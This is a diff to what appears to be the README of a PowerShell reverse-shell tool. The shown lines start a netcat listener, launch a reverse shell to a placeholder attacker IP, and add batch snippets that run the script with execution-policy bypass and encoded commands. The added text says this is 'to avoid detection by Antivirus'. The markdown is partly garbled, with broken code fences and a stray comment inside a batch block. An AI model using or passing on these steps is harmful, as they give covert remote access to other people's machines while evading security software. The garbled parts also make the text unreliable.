@@ -41,11 +41,25 @@ $ nc -lvp 4444
 Finally, you can start the reverse shell on the target machine by running the following command:
 
 ```powershell
-PS C:\> Start-ReverseShell -IPAddress "attacker_ip" -Port " 4444 " 
+PS C:\> Start-ReverseShell -IP "attacker_ip" -Port " 4444 " 
 ```
 
+It is best pratice to use encoded command to avoid detection by Antivirus
+in a batch file you can use the following command to run the script.
 
+```batch
+@echo off
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File "C:\path\to\ReverseShell.psm1"
+```
 
-## License
-This script is licensed under the MIT License. See the LICENSE file for more information.
+In the script, you can use the following command to encode the script.
+
+```batch
+@echo off # Don't forget to add the ampersand at the beginning of the command.
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -EncodedCommand "& EncodedCommand"
+````
+## Changelog
+- 1.0: Initial script
+````
+```
 
